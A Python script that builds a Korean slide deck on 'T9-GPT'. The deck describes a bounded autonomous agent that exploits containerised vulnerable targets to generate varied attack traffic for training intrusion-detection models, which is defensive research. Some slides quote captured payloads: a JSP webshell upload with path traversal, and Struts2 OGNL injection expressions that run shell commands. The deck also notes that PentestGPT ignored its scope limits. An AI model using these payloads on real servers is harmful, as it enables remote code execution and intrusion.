#!/usr/bin/env python3
"""Generate the Korean T9-GPT agent-approach deck for teammates.

Reuses the styling helpers/theme from create_pipeline_ppt.py and tells the story
of the bounded-autonomous-agent ("diversity") pipeline: what it does, how it
works, how it differs from the previous approaches, its benefits and tradeoffs —
grounded in the real Struts2 CVE-2023-50164 results.
"""

from __future__ import annotations

from pathlib import Path

from pptx import Presentation
from pptx.enum.shapes import MSO_SHAPE
from pptx.enum.text import PP_ALIGN
from pptx.util import Inches, Pt

import create_pipeline_ppt as _cp
from create_pipeline_ppt import (
    BG, BORDER, CYAN, GREEN, MONO, MUTED, PANEL, PANEL_2, PURPLE, RED, TEXT,
    WHITE, YELLOW, SH, SW,
    add_text, arrow, bullet_list, card, code_block, connector, pill, rect,
    section_label, title,
)

OUT = Path(__file__).resolve().parent.parent / "T9-GPT-Agent-Approach-KR.pptx"
TOTAL = 18


def _angular_rect(slide, x, y, w, h, fill=PANEL, line=BORDER, radius=False):
    """Sharp-cornered replacement for the shared rounded-rect helper."""
    shape = slide.shapes.add_shape(
        MSO_SHAPE.RECTANGLE, Inches(x), Inches(y), Inches(w), Inches(h)
    )
    shape.fill.solid()
    shape.fill.fore_color.rgb = fill
    shape.line.color.rgb = line
    shape.line.width = Pt(1)
    return shape


# Make every box angular — both our direct calls and the ones inside the
# imported helpers (card / pill / code_block resolve `rect` from this module).
rect = _angular_rect
_cp.rect = _angular_rect


def _bg(slide):
    slide.background.fill.solid()
    slide.background.fill.fore_color.rgb = BG


def build() -> Presentation:
    prs = Presentation()
    prs.slide_width = SW
    prs.slide_height = SH
    blank = prs.slide_layouts[6]

    # 1. Cover ----------------------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    add_text(s, "T9", 0.42, 0.78, 3.3, 1.65, size=118, color=RED, bold=True)
    add_text(s, "GPT", 2.83, 1.39, 4.2, 1.15, size=80, color=WHITE, bold=True)
    add_text(s, "자율 에이전트 기반 다양성 공격 로그 생성", 0.45, 3.25, 11.5, 0.65, size=25, color=TEXT, bold=True)
    add_text(
        s,
        "사람이 표적·CVE 지정  →  에이전트가 매번 다른 기법으로 익스플로잇  →  다양하지만 일관된 로그",
        0.45, 3.98, 12.4, 0.4, size=14.5, color=CYAN,
    )
    pill(s, "PHASE 1 DONE", 0.45, 4.7, 1.75, GREEN)
    pill(s, "CLAUDE-LOOP", 2.36, 4.7, 1.8, CYAN)
    pill(s, "DOCKER / VULHUB", 4.32, 4.7, 2.2, YELLOW)
    pill(s, "NDR · PCAP", 6.68, 4.7, 1.55, PURPLE)
    add_text(s, "Bounded Autonomous Agent — Diversity Log Generation", 0.45, 5.4, 9.0, 0.4, size=13, color=MUTED)
    add_text(s, "2026", 11.65, 6.46, 1.2, 0.5, size=18, color=RED, bold=True, align=PP_ALIGN.RIGHT)
    add_text(s, "t9project.dev", 0.45, 6.68, 4.0, 0.3, size=13, color=CYAN)

    # 2. Problem --------------------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "왜 바꾸는가 — 기존 T9의 한계", "동일한 공격을 반복하면 동일한 로그만 쌓인다", 2, TOTAL)
    card(s, "① 수작업 PoC", "CVE마다 사람이 직접 익스플로잇\n코드를 작성·유지해야 함", 0.45, 1.5, 3.95, 1.7, RED)
    card(s, "② 결정적 = 동일 로그", "같은 스크립트는 거의 동일한 패킷을\n생성 → 탐지 모델이 한 시그니처에 과적합", 4.55, 1.5, 3.95, 1.7, YELLOW)
    card(s, "③ 확장성 한계", "시나리오를 늘릴수록 사람의\n작성·검증 비용이 선형 증가", 8.65, 1.5, 4.22, 1.7, PURPLE)
    rect(s, 0.45, 3.5, 12.43, 2.75, fill=PANEL)
    section_label(s, "목표", 0.7, 3.78, 3.0, GREEN)
    bullet_list(
        s,
        [
            "공격 기법을 다양화해 더 견고한 침입 탐지·예측 AI 모델을 학습한다.",
            "사람은 표적과 CVE만 지정하고, 익스플로잇의 ‘방법’은 에이전트가 결정한다.",
            "단, 자유도를 통제해 결과가 주제에서 벗어나지 않고 비용이 예측 가능해야 한다.",
            "수집 후에는 환경을 완전히 정리한다. (Docker·Vulhub 우선, EDR로 확장 예정)",
        ],
        0.7, 4.2, 11.9, 1.85, size=14, bullet_color=GREEN,
    )

    # 3. Core idea ------------------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "핵심 아이디어 — 다양하지만 일관되게", "두 힘의 균형: 사람이 범위를 고정하고, 에이전트가 기법을 변화시킨다", 3, TOTAL)
    rect(s, 0.48, 1.5, 6.0, 4.7, fill=PANEL, line=GREEN)
    section_label(s, "일관성 (Consistency) — 자유 제한", 0.75, 1.78, 5.5, GREEN)
    bullet_list(
        s,
        [
            "사람이 표적·CVE·전술·예산을 시나리오에 고정",
            "시스템 프롬프트로 정찰·스캔·열거 금지",
            "오직 지정된 host:port만 공격",
            "예산 상한과 proof token으로 조기 종료",
        ],
        0.75, 2.3, 5.5, 3.5, size=13.5, bullet_color=GREEN,
    )
    arrow(s, 6.62, 3.6, 0.6, 0.5, CYAN)
    rect(s, 7.4, 1.5, 5.48, 4.7, fill=PANEL, line=CYAN)
    section_label(s, "다양성 (Diversity) — 자유 허용", 7.67, 1.78, 5.0, CYAN)
    bullet_list(
        s,
        [
            "payload·인코딩·도구·요청 형태를 자유 선택",
            "시나리오 기법 뱅크에서 매 실행 다른 기법 선택",
            "실행마다 다른 네트워크 시그니처 생성",
            "모델 변주 + 반복 방지 메모리로 다양성 보장",
        ],
        7.67, 2.3, 5.0, 3.5, size=13.5, bullet_color=CYAN,
    )
    add_text(
        s,
        "→ 같은 취약 환경(예: Apache Struts2)을 매번 다른 기법으로 익스플로잇한다",
        0.6, 6.35, 12.2, 0.4, size=13.5, color=WHITE, bold=True, align=PP_ALIGN.CENTER,
    )

    # 4. Evolution of approaches ---------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "접근 방식의 진화 — 개념은 그대로, 엔진만 업그레이드", "입력 인터페이스는 동일하고, 실행 엔진만 바뀐다", 4, TOTAL)
    # Banner: the human-facing interface is unchanged across all three.
    rect(s, 0.45, 1.3, 12.43, 0.62, fill=PANEL_2, line=CYAN)
    pill(s, "UNCHANGED", 0.62, 1.45, 1.5, CYAN, size=9.5)
    add_text(
        s,
        "입력은 동일 — 사람이 scenarios/*.json 에 표적·CVE·환경을 지정 (T9 코드 체계 유지)",
        2.3, 1.45, 10.4, 0.4, size=13, color=WHITE, bold=True,
    )
    cols = [
        (0.95, "이전 (기존 T9)  수작업 PoC", RED, "t9_example", [
            "VirtualBox VM + SSH(paramiko)",
            "CVE별로 사람이 파이썬 PoC 작성",
            "고정 스크립트 → 매번 동일 로그",
            "확장·유지 비용 큼 · 과적합 위험",
        ]),
        (7.15, "현재  자율 에이전트", GREEN, "claude-loop", [
            "에이전트가 런타임에 기법 결정",
            "실행마다 다른 익스플로잇 → 다양",
            "예산 cap·시스템 프롬프트로 통제",
            "주제 고정 + 기법 변화 동시 달성",
        ]),
    ]
    for x, heading, color, tag, items in cols:
        rect(s, x, 2.12, 5.25, 4.0, fill=PANEL, line=color)
        add_text(s, heading, x + 0.3, 2.32, 4.6, 0.4, size=16, color=color, bold=True)
        pill(s, tag, x + 0.3, 2.82, 1.95, color, size=9.5)
        bullet_list(s, items, x + 0.3, 3.36, 4.7, 2.6, size=13, bullet_color=color)
    # Arrow between the two stages.
    add_text(s, "→", 6.2, 3.7, 0.95, 0.9, size=40, color=CYAN, bold=True, align=PP_ALIGN.CENTER)
    # Footnote: deterministic replay is a co-existing current mode, NOT a past T9 stage.
    add_text(
        s,
        "참고: 결정적 재현 모드(planner.py)는 ‘과거 T9 단계’가 아니라 정확한 재현이 필요할 때 쓰는 현재의 보조 모드 — 에이전트 모드와 공존",
        0.95, 6.22, 11.45, 0.4, size=11, color=MUTED, align=PP_ALIGN.CENTER,
    )
    add_text(
        s,
        "결론: T9의 개념·인터페이스는 그대로 — 엔진만 ‘수작업 PoC → 자율 에이전트’로 업그레이드 (동일 로그 → 다양한 로그)",
        0.5, 6.66, 12.4, 0.45, size=12.8, color=WHITE, bold=True, align=PP_ALIGN.CENTER,
    )

    # 5. Pipeline -------------------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "전체 실행 흐름 — 한 명령에서 데이터셋까지", "토큰은 ‘에이전트 실행’ 단계에서만 소비된다", 5, TOTAL)
    code_block(
        s,
        "uv run python orchestrator.py agent --config scenarios/example.json \\\n"
        "  --t9-code T9-25-01-S-N-CL --budget 0.50 [--repeat N]",
        0.45, 1.4, 12.42, 0.82, size=12,
    )
    steps = [
        ("1", "Scenario", "JSON 검증", CYAN),
        ("2", "Target Up", "Vulhub 기동", RED),
        ("3", "Capture", "tcpdump 시작", GREEN),
        ("4", "Bounded Agent", "토큰 소비 지점", PURPLE),
        ("5", "Oracle+Label", "지상검증 라벨", YELLOW),
        ("6", "Teardown", "완전 정리", CYAN),
        ("7", "Dataset", "PCAP + manifest", WHITE),
    ]
    x = 0.38
    for idx, (num, name, body, color) in enumerate(steps):
        w = 1.42 if idx < 6 else 1.55
        rect(s, x, 2.55, w, 1.62, fill=PANEL, line=PURPLE if idx == 3 else BORDER)
        pill(s, num, x + 0.12, 2.68, 0.42, color, size=11)
        add_text(s, name, x + 0.06, 3.12, w - 0.12, 0.31, size=11.2, color=color, bold=True, align=PP_ALIGN.CENTER)
        add_text(s, body, x + 0.06, 3.52, w - 0.12, 0.46, size=9.5, color=TEXT, align=PP_ALIGN.CENTER)
        if idx < len(steps) - 1:
            arrow(s, x + w + 0.04, 3.2, 0.25, 0.3)
        x += w + 0.34
    rect(s, 0.45, 4.55, 6.1, 1.75, fill=PANEL, line=PURPLE)
    section_label(s, "토큰은 여기서만", 0.7, 4.8, 4.0, PURPLE)
    bullet_list(
        s,
        [
            "에이전트 1세션 / 실행 · 예산 하드 캡",
            "나머지 단계는 무료·결정적 (baseline 사전점검도 무료)",
            "라벨링은 4 proof oracle + 구조화 출력(추가 호출 없음)",
        ],
        0.7, 5.25, 5.6, 1.0, size=12, bullet_color=PURPLE,
    )
    rect(s, 6.75, 4.55, 6.13, 1.75, fill=PANEL, line=GREEN)
    section_label(s, "정리 보장", 7.0, 4.8, 4.0, GREEN)
    bullet_list(
        s,
        [
            "성공·실패·예외와 무관하게 finally에서 teardown",
            "compose down --volumes · 네트워크·임시파일 제거",
            "실측: 모든 실행 후 컨테이너·네트워크 누수 0",
        ],
        7.0, 5.25, 5.7, 1.0, size=12, bullet_color=GREEN,
    )

    # 6. Engine decision ------------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "엔진 결정 — 왜 claude-loop인가 (실측 근거)", "실제 PentestGPT를 먼저 시험한 뒤 내린 결론", 6, TOTAL)
    rect(s, 0.48, 1.5, 6.0, 4.5, fill=PANEL, line=RED)
    section_label(s, "PentestGPT (실측) — 부적합", 0.75, 1.78, 5.5, RED)
    bullet_list(
        s,
        [
            "--instruction 제약 무시 (nmap·gobuster 실행)",
            "ctf 모드는 flag가 없으면 종료 안 함",
            "전체 15분 wall-clock까지 광범위 정찰",
            "중도 강제 종료 → 비용 측정 불가 (~$1–3 추정)",
        ],
        0.75, 2.3, 5.5, 3.2, size=13, bullet_color=RED,
    )
    add_text(s, "통제 약함 · 비쌈 · 노이즈 큼", 0.75, 5.5, 5.5, 0.35, size=12.5, color=RED, bold=True, align=PP_ALIGN.CENTER)
    arrow(s, 6.62, 3.55, 0.6, 0.5, CYAN)
    rect(s, 7.4, 1.5, 5.48, 4.5, fill=PANEL, line=GREEN)
    section_label(s, "claude-loop (실측) — 채택", 7.67, 1.78, 5.0, GREEN)
    bullet_list(
        s,
        [
            "시스템 프롬프트를 우리가 완전 소유",
            "--max-budget-usd 하드 캡 = 토큰 통제 핵심",
            "proof token 출력 = 성공·종료 신호",
            "실측: 범위 준수 100%, $0.51, 정찰 0",
        ],
        7.67, 2.3, 5.0, 3.2, size=13, bullet_color=GREEN,
    )
    add_text(s, "통제 강함 · 저렴 · 측정 가능", 7.67, 5.5, 5.0, 0.35, size=12.5, color=GREEN, bold=True, align=PP_ALIGN.CENTER)
    add_text(
        s,
        "PentestGPT는 --engine pentestgpt 로 선택 가능한 ‘정밀 탐색’ 옵션으로 유지",
        0.6, 6.35, 12.2, 0.35, size=12.5, color=MUTED, align=PP_ALIGN.CENTER,
    )

    # 7. Control mechanisms ---------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "에이전트 통제 — 자유는 주되, 범위는 강제", "프롬프트 힌트가 아니라 시스템 프롬프트 + CLI로 강제한다", 7, TOTAL)
    card(s, "시스템 프롬프트 소유", "정찰·스캔·열거 금지, 취약점은 ‘이미 확인됨’,\n바로 익스플로잇, Bash 도구만 사용", 0.45, 1.5, 6.0, 1.75, GREEN)
    card(s, "예산 상한  --max-budget-usd", "실행당 달러 하드 캡 → 토큰 통제의 핵심 레버\n(기본 $0.5, --budget 으로 조정)", 6.88, 1.5, 6.0, 1.75, YELLOW)
    card(s, "Proof — 4가지 Oracle", "성공은 ground truth로만 판정:\n응답본문 · 마커파일 · 서버로그 · OOB 콜백", 0.45, 3.45, 6.0, 1.75, CYAN)
    card(s, "도구 화이트리스트  --allowed-tools", "Bash 만 허용 · bypassPermissions 로 무인 실행 ·\nwall-clock 타임아웃 백스톱", 6.88, 3.45, 6.0, 1.75, PURPLE)
    rect(s, 0.45, 5.45, 12.43, 1.0, fill=PANEL_2, line=GREEN)
    add_text(s, "결과", 0.7, 5.62, 1.2, 0.3, size=13, color=GREEN, bold=True)
    add_text(
        s,
        "실측 transcript에서 금지 도구(nmap·gobuster·dirb·sqlmap 등) 사용 0건 — 시스템 프롬프트 제약이 실제로 지켜짐",
        2.0, 5.62, 10.7, 0.7, size=13, color=WHITE, bold=True,
    )

    # 8. Upgrade 1 — diversity engine (Tier 1) --------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "업그레이드 ① — 통제된 다양성 엔진", "‘다르게 해줘’ 힌트가 아니라, 시나리오의 기법 뱅크에서 매 실행 다른 기법을 선택", 8, TOTAL)
    card(s, "기법 뱅크 (Technique Bank)",
         "시나리오마다 서로 다른 익스플로잇 기법 목록\n실행마다 하나 선택 → 각 기법이 곧 라벨\n(MITRE · 주입점 · payload 계열)",
         0.45, 1.5, 6.0, 1.9, CYAN)
    card(s, "반복 방지 메모리",
         "직전 실행들이 쓴 기법을 manifest에서 읽어\n회피 → 같은 기법으로의 수렴 차단\n(PentAGI 메모리의 ‘역발상’ 활용)",
         6.88, 1.5, 6.0, 1.9, GREEN)
    card(s, "모델 변주 (Model Pool)",
         "실행 index로 모델 로테이션 →\n같은 기법도 다른 명령 스타일·페이싱\n재시도 시 모델 상향(escalation)",
         0.45, 3.6, 6.0, 1.9, PURPLE)
    card(s, "결과 = 보장된 다양성",
         "기법·모델·payload가 실행마다 달라짐\n+ 실행 전에 어떤 기법인지 알 수 있음\n→ 공짜 ground-truth 라벨",
         6.88, 3.6, 6.0, 1.9, YELLOW)
    rect(s, 0.45, 5.72, 12.43, 0.72, fill=PANEL_2, line=CYAN)
    add_text(s, "예시", 0.7, 5.87, 1.0, 0.3, size=12, color=CYAN, bold=True)
    add_text(
        s,
        "Struts2 s2-045: classic-ognl-echo · ognl-blind-marker · ognl-alt-wrapper    |    "
        "Log4Shell: JNDI in foo-param · User-Agent · alt-header/rmi",
        1.55, 5.87, 11.2, 0.45, size=11.3, color=WHITE, bold=True,
    )

    # 9. Upgrade 2 — verified labels / proof oracles (Tier 2) -----------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "업그레이드 ② — 검증된 성공 라벨 (4 Proof Oracle)", "성공은 transcript가 아니라 ‘지상 검증(ground truth)’으로만 판정", 9, TOTAL)
    oracles = [
        ("reflected_http", "HTTP 응답 본문에 proof token 등장 (반사형 RCE) — tshark로 응답만 검사", GREEN),
        ("container_marker", "타깃이 토큰명 파일을 생성 (blind RCE) — docker exec test -f", CYAN),
        ("container_log", "타깃 로그 파일에 토큰 기록 (Log4Shell 등 서버측 로그만 흔적) — docker exec grep", YELLOW),
        ("oob_callback", "캡처된 트래픽 어디에든 토큰 (아웃오브밴드 콜백) — frame contains", PURPLE),
    ]
    oy = 1.5
    for name, desc, color in oracles:
        rect(s, 0.45, oy, 12.43, 0.72, fill=PANEL, line=BORDER)
        bar = s.shapes.add_shape(MSO_SHAPE.RECTANGLE, Inches(0.45), Inches(oy), Inches(0.06), Inches(0.72))
        bar.fill.solid()
        bar.fill.fore_color.rgb = color
        bar.line.fill.background()
        add_text(s, name, 0.66, oy + 0.2, 3.1, 0.32, size=13, color=color, bold=True, font=MONO)
        add_text(s, desc, 3.95, oy + 0.2, 8.75, 0.32, size=11.5, color=TEXT)
        oy += 0.82
    rect(s, 0.45, oy + 0.04, 6.0, 1.35, fill=PANEL_2, line=GREEN)
    section_label(s, "구조화 출력", 0.7, oy + 0.18, 3.0, GREEN)
    add_text(
        s,
        "에이전트가 마지막에 T9_RESULT {기법·주입점·payload·도구} 블록을 출력 →\ntranscript 파싱 없이 자동 라벨 (Phase 2가 절반 완성)",
        0.7, oy + 0.52, 5.5, 0.8, size=11.0, color=WHITE,
    )
    rect(s, 6.88, oy + 0.04, 6.0, 1.35, fill=PANEL_2, line=RED)
    section_label(s, "stop-on-proof", 7.13, oy + 0.18, 3.0, RED)
    add_text(
        s,
        "완료 블록 이후에도 계속 도구를 쓰는 ‘폭주’ 에이전트만 강제 종료 →\n예산 절감 (정상 종료는 비용·세션 정보 보존)",
        7.13, oy + 0.52, 5.5, 0.8, size=11.0, color=WHITE,
    )

    # 10. Upgrade 3 — reliability + product (Tier 3+4) ------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "업그레이드 ③ — 실패에 비용 안 쓰기 + 데이터셋이 곧 제품", "Tier 3 신뢰성 · Tier 4 산출물", 10, TOTAL)
    rect(s, 0.48, 1.5, 6.0, 4.35, fill=PANEL, line=GREEN)
    section_label(s, "Tier 3 — 실패에 비용 안 쓰기", 0.75, 1.76, 5.5, GREEN)
    bullet_list(
        s,
        [
            "baseline 사전점검(무LLM 정본 PoC): 취약 확인 실패 시 에이전트 스킵 = 토큰 0",
            "‘타깃 고장’과 ‘에이전트 실패’를 구분",
            "기법 순환 재시도: 미확인 시 다음 기법으로(+모델 상향)",
            "공격 시도마다 개별 캡처 → 라벨별 트래픽 분리",
        ],
        0.75, 2.24, 5.5, 3.4, size=12.5, bullet_color=GREEN,
    )
    rect(s, 6.9, 1.5, 6.0, 4.35, fill=PANEL, line=CYAN)
    section_label(s, "Tier 4 — 데이터셋이 곧 제품", 7.17, 1.76, 5.5, CYAN)
    bullet_list(
        s,
        [
            "익스플로잇 스크립트: 성공 시 재현 스크립트(exploit.sh) 자동 저장",
            "benign 하드네거티브: 같은 표적·하네스로 ‘정상 트래픽’ 샘플 라벨",
            "rich 메타데이터: 샘플마다 기법·MITRE·주입점·payload·라벨·비용·모델",
            "→ 탐지 모델 학습에 바로 쓰는 라벨 데이터셋",
        ],
        7.17, 2.24, 5.5, 3.4, size=12.5, bullet_color=CYAN,
    )
    add_text(
        s,
        "산출물 = 공격 + 정상, 각 샘플에 근거(proof)·재현(script)·비용·라벨이 함께 붙은 학습용 데이터셋",
        0.6, 6.05, 12.2, 0.4, size=12.5, color=WHITE, bold=True, align=PP_ALIGN.CENTER,
    )

    # 11. Empirical diversity -------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "실측 ① — Struts2 CVE-2023-50164, 2회 실행", "같은 CVE, 전혀 다른 익스플로잇 기법", 11, TOTAL)
    rect(s, 0.48, 1.5, 6.0, 3.5, fill=PANEL, line=CYAN)
    section_label(s, "RUN 1 — 웹셸 업로드", 0.75, 1.76, 5.5, CYAN)
    bullet_list(
        s,
        [
            "POST /upload.action 으로 JSP 웹셸 업로드",
            "shell.jsp · exec.jsp · pwn.jsp · rce.jsp …",
            "/upload/ · /uploads/ · /struts/ · /WEB-INF/ 탐색",
        ],
        0.75, 2.24, 5.5, 1.8, size=12.5, bullet_color=CYAN,
    )
    add_text(s, "고유 경로 12개", 0.75, 4.18, 5.5, 0.32, size=12, color=CYAN, bold=True, align=PP_ALIGN.CENTER)
    pill(s, "라벨: 시도 · 미확인 (404)", 1.73, 4.55, 3.5, YELLOW, size=10)
    rect(s, 6.88, 1.5, 6.0, 3.5, fill=PANEL, line=GREEN)
    section_label(s, "RUN 2 — OGNL 인젝션", 7.15, 1.76, 5.5, GREEN)
    bullet_list(
        s,
        [
            "?debug=command&expression= OGNL 표현식 주입",
            "ProcessBuilder · Runtime.exec · redirect:${…}",
            "전혀 다른 기법 + 다른 웹셸 이름",
        ],
        7.15, 2.24, 5.5, 1.8, size=12.5, bullet_color=GREEN,
    )
    add_text(s, "고유 경로 20개", 7.15, 4.18, 5.5, 0.32, size=12, color=GREEN, bold=True, align=PP_ALIGN.CENTER)
    pill(s, "라벨: RCE 확인 (응답 토큰)", 8.15, 4.55, 3.5, GREEN, size=10)
    rect(s, 0.48, 5.2, 12.4, 1.25, fill=PANEL_2, line=WHITE)
    add_text(
        s,
        "공유 요청은 POST /upload.action 단 1개 — 나머지는 완전히 다른 네트워크 시그니처 (각 ~$0.50 cap · 드롭 0 · 정찰 0 · 완전 정리)",
        0.7, 5.38, 12.0, 0.35, size=12.5, color=WHITE, bold=True,
    )
    add_text(
        s,
        "성공 라벨은 transcript가 아니라 PCAP 응답 본문의 proof token으로 판정 → R1의 거짓 양성을 자동 차단 (Ground-Truth Labeling)",
        0.7, 5.85, 12.0, 0.4, size=12.5, color=GREEN,
    )

    # 12. Empirical diversity 2 — byte-level payload differences ---------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "실측 ② — s2-045(CVE-2017-5638) 3회 실행 · 바이트 단위로 다른 페이로드", "같은 CVE·같은 표적 — 반복 방지가 3개 기법을 무중복 100% 커버", 12, TOTAL)
    runs = [
        ("RUN 1", "classic-ognl-echo", CYAN, [
            "HTTP: GET /",
            "OGNL 변수: #_ · 큰따옴표",
            "명령: echo → 응답 반사",
            "proof: reflected_http",
            "832 B · sha 94cdee2f",
        ]),
        ("RUN 2", "ognl-blind-marker", GREEN, [
            "HTTP: POST /",
            "OGNL 변수: #_ · 작은따옴표",
            "명령: touch /tmp/<tok> (블라인드)",
            "proof: container_marker",
            "631 B · sha 24e3b846",
        ]),
        ("RUN 3", "ognl-alt-wrapper", PURPLE, [
            "HTTP: GET /",
            "OGNL 변수: #nike/#ctx · 작은따옴표",
            "언락 체인 다름 (ternary 없음)",
            "proof: reflected_http",
            "783 B · sha c96e6216",
        ]),
    ]
    for x, (run, tech, color, items) in zip((0.5, 4.52, 8.54), runs):
        rect(s, x, 1.55, 3.8, 3.98, fill=PANEL, line=color)
        pill(s, run, x + 0.26, 1.78, 1.15, color, size=10)
        add_text(s, tech, x + 0.26, 2.26, 3.35, 0.34, size=12.5, color=color, bold=True, font=MONO)
        bullet_list(s, items, x + 0.26, 2.78, 3.4, 2.6, size=11.5, bullet_color=color)
    rect(s, 0.48, 5.72, 12.4, 0.95, fill=PANEL_2, line=GREEN)
    add_text(s, "반복 방지 메모리", 0.72, 5.88, 3.0, 0.3, size=12, color=GREEN, bold=True)
    add_text(
        s,
        "avoided:  [] → [classic-ognl-echo] → [ognl-blind-marker, classic-ognl-echo]    ·    3런 3기법 무중복",
        3.0, 5.88, 9.7, 0.3, size=11.3, color=WHITE, bold=True,
    )
    add_text(
        s,
        "서로 다른 SHA·길이·HTTP 메서드·OGNL 구조 → 같은 CVE, 서로 다른 네트워크 시그니처 (IDS 과적합 해소)",
        0.72, 6.26, 12.0, 0.35, size=11.5, color=CYAN,
    )

    # 13. Collected log examples ----------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "수집된 로그 예시 — 실제 PCAP에서 추출", "같은 CVE, 두 실행의 실제 공격 트래픽", 13, TOTAL)
    section_label(s, "RUN 1 — 웹셸 업로드 · 시도(미확인)", 0.47, 1.4, 6.0, YELLOW)
    code_block(
        s,
        "POST /upload.action   (multipart)\n"
        '  filename="shell.jsp"\n'
        "  <% Process p = Runtime.getRuntime()\n"
        '       .exec({"/bin/sh","-c",\n'
        '         request.getParameter("cmd")}); %>\n'
        "  uploadFileName =\n"
        "    ../../../../usr/local/tomcat/\n"
        "      webapps/ROOT/shell.jsp\n"
        "\n"
        "GET /shell.jsp?cmd=echo+T9PROOF3025bc..\n"
        "  --> 404 · 응답에 토큰 없음 (미확인)",
        0.47, 1.82, 6.0, 4.35, size=10.3,
    )
    section_label(s, "RUN 2 — OGNL 표현식 인젝션 · RCE 확인", 6.9, 1.4, 6.0, GREEN)
    code_block(
        s,
        "# URL 디코딩\n"
        "GET /upload.action?debug=command\n"
        "  &expression= #_memberAccess=\n"
        "    @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS\n"
        "GET /upload.action?debug=command\n"
        "  &expression= #cmd='echo T9PROOF5dd59a..'\n"
        "    ,#p=new java.lang.ProcessBuilder(\n"
        '       {"/bin/bash","-c",#cmd}).start()\n'
        "GET /index.action?redirect:${(..\n"
        "    #cmd='echo T9PROOF5dd59a..')}\n"
        "  --> 응답: T9PROOF5dd59a..   (RCE 확인)",
        6.9, 1.82, 6.0, 4.35, size=10.3,
    )
    add_text(
        s,
        "R2는 proof token이 응답 본문에 등장 → RCE 확인 · R1은 응답에 없음(요청에만) → 시도(미확인). 같은 CVE·다른 기법, 라벨은 PCAP로 판정",
        0.6, 6.35, 12.2, 0.4, size=12.0, color=WHITE, bold=True, align=PP_ALIGN.CENTER,
    )

    # 14. Benefits ------------------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "장점", "기존 방식 대비 무엇이 좋아지는가", 14, TOTAL)
    benefits = [
        ("수작업 PoC 제거", "CVE별 익스플로잇 코드를 사람이\n작성할 필요 없음", GREEN),
        ("로그 다양성", "실행마다 다른 기법 → 탐지·예측\n모델의 견고성 향상", CYAN),
        ("비용 예측·통제", "실행당 달러 하드 캡으로\n토큰 사용 상한 보장", YELLOW),
        ("일관성 보장", "범위 강제 + proof token 으로\n주제 이탈·노이즈 차단", PURPLE),
        ("완전 정리", "성공·실패 무관 finally teardown,\n환경 누수 0 (실측)", RED),
        ("기존 인프라 재사용", "격리·캡처·정리 모듈을 그대로 활용,\nPentestGPT는 opt-in 유지", WHITE),
    ]
    pos = [(0.5, 1.5), (4.52, 1.5), (8.54, 1.5), (0.5, 3.95), (4.52, 3.95), (8.54, 3.95)]
    for (h, b, c), (x, y) in zip(benefits, pos):
        card(s, h, b, x, y, 3.8, 2.05, c, body_size=12.5)

    # 15. Tradeoffs -----------------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "트레이드오프 / 유의사항", "다양성과 자율성에는 비용이 따른다", 15, TOTAL)
    tradeoffs = [
        ("비결정성", "실행마다 결과가 다름 → 정확한 재현 불가.\n결정적 모드는 별도로 보존(opt-in)", RED),
        ("성공 보장 못함", "예산 내 익스플로잇 실패 가능.\n단 정찰로 빠지지 않고 깔끔히 종료", YELLOW),
        ("실행당 비용 발생", "결정적 재생(무료)과 달리 토큰 소비.\n예산 cap으로 상한만 보장", PURPLE),
        ("baseline 유지비", "정본 PoC를 시나리오마다 작성·검증해야\n효과 (선택 사항 · 없으면 스킵)", CYAN),
        ("현재 NDR 전용", "EDR(Process·Memory·Registry)·Windows·\nVM은 향후 단계", RED),
        ("자율 실행 안전성", "무인(bypassPermissions) 실행 →\n격리 컨테이너·일회용 환경 필수", WHITE),
    ]
    pos = [(0.5, 1.5), (4.52, 1.5), (8.54, 1.5), (0.5, 3.95), (4.52, 3.95), (8.54, 3.95)]
    for (h, b, c), (x, y) in zip(tradeoffs, pos):
        card(s, h, b, x, y, 3.8, 2.05, c, body_size=11.8)
    add_text(
        s,
        "정확한 재현이 필요하면 결정적 모드를, 다양성이 필요하면 에이전트 모드를 — 두 모드를 모두 보유",
        0.6, 6.25, 12.2, 0.35, size=13, color=WHITE, bold=True, align=PP_ALIGN.CENTER,
    )

    # 16. Scope & limitations -------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "적용 범위와 한계 — 모든 CVE에 되는가?", "아니다 — 특정 ‘스윗 스팟’에서 가장 잘 동작한다", 16, TOTAL)
    rect(s, 0.48, 1.5, 6.0, 3.45, fill=PANEL, line=GREEN)
    section_label(s, "잘 동작하는 경우", 0.75, 1.76, 5.5, GREEN)
    bullet_list(
        s,
        [
            "네트워크 HTTP(S) 웹 취약점 (RCE·인젝션·업로드·역직렬화)",
            "공개·문서화된 익스플로잇 — 모델이 이미 아는 기법",
            "단일 컨테이너 Vulhub + 공개 포트",
            "성공 관찰: 반사·마커·서버로그·OOB 4가지 oracle로 판정",
        ],
        0.75, 2.24, 5.5, 2.6, size=12.5, bullet_color=GREEN,
    )
    rect(s, 6.9, 1.5, 6.0, 3.45, fill=PANEL, line=RED)
    section_label(s, "어렵거나 안 되는 경우", 7.17, 1.76, 5.5, RED)
    bullet_list(
        s,
        [
            "모델이 모르는 최신·비공개 CVE (정찰 금지·인터넷 없음)",
            "실제 외부 서버 필요: 리버스셸·완전한 LDAP/RMI 익스플로잇 체인",
            "비네트워크: 로컬 권한상승·커널·GUI·클라이언트측",
            "인증·다단계 셋업·시드 데이터 필요",
            "비RCE 임팩트(DoS·정보유출) · Windows·VM·비HTTP",
        ],
        7.17, 2.24, 5.5, 2.6, size=12.3, bullet_color=RED,
    )
    rect(s, 0.48, 5.15, 12.4, 1.35, fill=PANEL_2, line=YELLOW)
